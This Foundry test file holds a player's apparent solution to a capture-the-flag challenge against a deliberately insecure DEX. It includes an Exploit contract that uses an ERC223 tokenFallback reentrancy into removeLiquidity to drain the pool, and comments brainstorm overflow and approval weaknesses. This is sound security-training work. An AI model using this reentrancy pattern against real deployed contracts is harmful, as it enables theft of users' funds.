// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";

import {SimpleERC223Token} from "../src/tokens/tokenERC223.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {InsecureDexLP} from "../src/Challenge2.DEX.sol";


contract Challenge2Test is Test {
    InsecureDexLP target; 
    IERC20 token0;
    IERC20 token1;

    address player = makeAddr("player");

    function setUp() public {
        address deployer = makeAddr("deployer");
        vm.startPrank(deployer);

        
        token0 = IERC20(new InSecureumToken(10 ether));
        token1 = IERC20(new SimpleERC223Token(10 ether));
        
        target = new InsecureDexLP(address(token0),address(token1));

        token0.approve(address(target), type(uint256).max);
        token1.approve(address(target), type(uint256).max);
        target.addLiquidity(9 ether, 9 ether);

        token0.transfer(player, 1 ether);
        token1.transfer(player, 1 ether);
        vm.stopPrank();

        vm.label(address(target), "DEX");
        vm.label(address(token0), "InSecureumToken");
        vm.label(address(token1), "SimpleERC223Token");
    }

    function testChallenge() public {  

        vm.startPrank(player);

        /*//////////////////////////////
        //    Add your hack below!    //
        //////////////////////////////*/      

        //============================//
        Exploit exploit = new Exploit(address(token0), address(token1), address(target), player);
        vm.label(address(exploit), "Exploit");

        // give liquidity to exploit contract
        token0.transfer(address(exploit), 1 ether);
        token1.transfer(address(exploit), 1 ether);

        // 
        exploit.approve();
        exploit.exploit(1 ether); // maybe in a loop?

        token0.transferFrom(address(exploit), player, token0.balanceOf(address(exploit)));
        token1.transferFrom(address(exploit), player, token1.balanceOf(address(exploit)));
        //exploit.withdraw();

        vm.stopPrank();
        // IDEA:
        // 1. unchecked blocks open up a chance for overflows/underflows to occur
        // overflow can occur in totalSupply or balances[msg.sender]
        // - try sending 0s?
        // 2. mismatched tokens ERC20 and ERC223
        // - what does 223 do?
        // 3. ERC223 contract here has a special _afterTokenTransfer method that calls tokenFallback in the DEX contract. Why? What's the issue?
        // - maybe we can write our own tokenFallback function that the ERC223 will call to do... something
        // 4. Deployer has set max approval for the tokens so that contract should be able to transfer everything

        assertEq(token0.balanceOf(player), 10 ether, "Player should have 10 ether of token0");
        assertEq(token1.balanceOf(player), 10 ether, "Player should have 10 ether of token1");
        assertEq(token0.balanceOf(address(target)), 0, "Dex should be empty (token0)");
        assertEq(token1.balanceOf(address(target)), 0, "Dex should be empty (token1)");

    }
}



/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
////////////////////////////////////////////////////////////*/


contract Exploit {
    IERC20 public token0; // this is insecureumToken
    IERC20 public token1; // this is simpleERC223Token
    InsecureDexLP public dex;
    address player;

    constructor (address _token0, address _token1, address _dex, address _player) {
        player = _player;
        token0 = IERC20(_token0);
        token1 = IERC20(_token1);
        dex = InsecureDexLP(_dex);
    }

    function approve() public {
        // Allow player and DEX to have full control over this contracts funds
        token0.approve(address(dex), 10 ether);
        token1.approve(address(dex), 10 ether);
        token0.approve(address(player), 10 ether);
        token1.approve(address(player), 10 ether);
    }
    function exploit(uint256 amount0) external {
        dex.addLiquidity(amount0, amount0);
        dex.removeLiquidity(amount0);
    }

    function withdraw() external {
        // Ideally, restrict this to the player address
        token0.transferFrom(address(this), player, token0.balanceOf(address(this)));
        token1.transferFrom(address(this), player, token1.balanceOf(address(this)));
    }

    function swap() external {
        dex.swap(address(token0), address(token1), 0);
    }

    // matching function signature defined in ERC223 contract
    function tokenFallback(address, uint256, bytes memory) external { 
        // End the reentrancy because the DEX is out of money
        if (dex.balanceOf(address(this)) == 0) {
            return;
        }
        // While the DEX has money, call removeLiquidity again so that it transfers more funds to this contract
        if (token0.balanceOf(address(dex)) > 0) {
            dex.removeLiquidity(1 ether);
        }
    }

}
